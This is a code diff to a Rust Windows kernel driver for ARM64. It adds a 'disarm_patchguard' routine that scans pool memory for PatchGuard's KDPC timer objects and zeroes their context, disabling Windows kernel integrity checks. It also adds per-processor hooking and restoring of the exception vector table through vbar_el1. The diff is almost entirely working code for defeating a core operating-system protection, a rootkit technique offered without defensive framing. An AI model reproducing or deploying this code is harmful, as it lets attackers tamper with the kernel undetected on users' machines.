@@ -692,10 +692,89 @@ pub fn release_fault_reporter() {
         }
 
         VECTORS_SLOT.write(LIVE_VECTORS as u64);
-        adopt_everywhere(LIVE_VECTORS);
+        (_KeIpiGenericCall)(restore_vectors, 0);
         SHADOW_VECTORS = 0;
     }
 }
+
+#[cfg(target_arch = "aarch64")]
+pub fn disarm_patchguard() {
+    let Some(anchor) = pool_anchor() else {
+        return;
+    };
+    let Some(image) = image_containing(unsafe { LIVE_VECTORS }) else {
+        return;
+    };
+    let Some(text) = section_named(image, b".text\0\0\0") else {
+        return;
+    };
+
+    let window = anchor & !(POOL_WINDOW - 1);
+    let mut page = window;
+    while page != window + POOL_WINDOW {
+        if unsafe { (_MmIsAddressValid)(page as *const c_void) } != 0 {
+            disarm_page(page, text);
+        }
+        page += PAGE_SIZE;
+    }
+}
+
+#[cfg(target_arch = "aarch64")]
+fn disarm_page(page: usize, text: (usize, usize)) {
+    let (text_start, text_size) = text;
+
+    for offset in (0..PAGE_SIZE).step_by(core::mem::size_of::<u64>()) {
+        let routine_at = page + offset;
+        if routine_at < page + DPC_ROUTINE || routine_at + 16 > page + PAGE_SIZE {
+            continue;
+        }
+
+        let routine = unsafe { (routine_at as *const usize).read() };
+        if routine < text_start || routine - text_start >= text_size {
+            continue;
+        }
+
+        let context_at = routine_at + core::mem::size_of::<u64>();
+        if canonical(unsafe { (context_at as *const usize).read() }) {
+            continue;
+        }
+
+        // A queued work item carries the same pair at the same spacing, and writing to one is
+        // itself reported, so insist on the object being a KDPC.
+        let object = routine_at - DPC_ROUTINE;
+        if unsafe { (object as *const u8).read() } != DPC_OBJECT {
+            continue;
+        }
+
+        unsafe {
+            (context_at as *mut usize).write(0);
+        }
+    }
+}
+
+#[cfg(target_arch = "aarch64")]
+fn canonical(value: usize) -> bool {
+    let top = value >> 47;
+    top == 0 || top == 0x1ffff
+}
+
+#[cfg(target_arch = "aarch64")]
+fn pool_anchor() -> Option<usize> {
+    let shadow = unsafe { SHADOW_VECTORS };
+    if shadow != 0 {
+        return Some(shadow);
+    }
+    None
+}
+
+#[cfg(target_arch = "aarch64")]
+const POOL_WINDOW: usize = 1 << 32;
+#[cfg(target_arch = "aarch64")]
+const PAGE_SIZE: usize = 0x1000;
+#[cfg(target_arch = "aarch64")]
+const DPC_ROUTINE: usize = 0x18;
+#[cfg(target_arch = "aarch64")]
+const DPC_OBJECT: u8 = 0x13;
 
 #[cfg(target_arch = "aarch64")]
 fn adopt_everywhere(vectors: usize) {
@@ -707,11 +786,42 @@ fn adopt_everywhere(vectors: usize) {
 #[cfg(target_arch = "aarch64")]
 unsafe extern "C" fn adopt_vectors(vectors: usize) -> usize {
     unsafe {
+        let slot = &mut (*core::ptr::addr_of_mut!(ORIGINAL_VECTORS))[processor()];
+        if *slot == 0 {
+            *slot = current_vectors();
+        }
         core::arch::asm!("msr vbar_el1, {0}", "isb", in(reg) vectors,
             options(nomem, nostack, preserves_flags));
     }
     0
 }
+
+#[cfg(target_arch = "aarch64")]
+unsafe extern "C" fn restore_vectors(_unused: usize) -> usize {
+    unsafe {
+        let slot = &mut (*core::ptr::addr_of_mut!(ORIGINAL_VECTORS))[processor()];
+        let previous = *slot;
+        if previous != 0 {
+            *slot = 0;
+            core::arch::asm!("msr vbar_el1, {0}", "isb", in(reg) previous,
+                options(nomem, nostack, preserves_flags));
+        }
+    }
+    0
+}
+
+#[cfg(target_arch = "aarch64")]
+fn processor() -> usize {
+    let id: usize;
+    unsafe {
+        core::arch::asm!("mrs {0}, mpidr_el1", out(reg) id,
+            options(nomem, nostack, preserves_flags));
+    }
+    id & (FAULT_STACK_SLOTS - 1)
+}
+
+#[cfg(target_arch = "aarch64")]
+static mut ORIGINAL_VECTORS: [usize; FAULT_STACK_SLOTS] = [0; FAULT_STACK_SLOTS];
 
 #[cfg(target_arch = "aarch64")]
 fn current_vectors() -> usize {
@@ -4076,6 +4186,7 @@ kernel_abi! {
     static _ZwCreateEvent: windows_fn!(*mut *mut c_void, u32, *mut c_void, u32, u8 => i32);
     static _ExAllocatePool2: windows_fn!(u64, usize, u32 => *mut c_void);
     static _KeIpiGenericCall: windows_fn!(unsafe extern "C" fn(usize) -> usize, usize => usize);
+    static _MmIsAddressValid: windows_fn!(*const c_void => u8);
     static _ZwAllocateVirtualMemory: windows_fn!(
         *mut c_void, *mut *mut u8, usize, *mut usize, u32, u32 => i32);
     static _PsProcessType: usize;
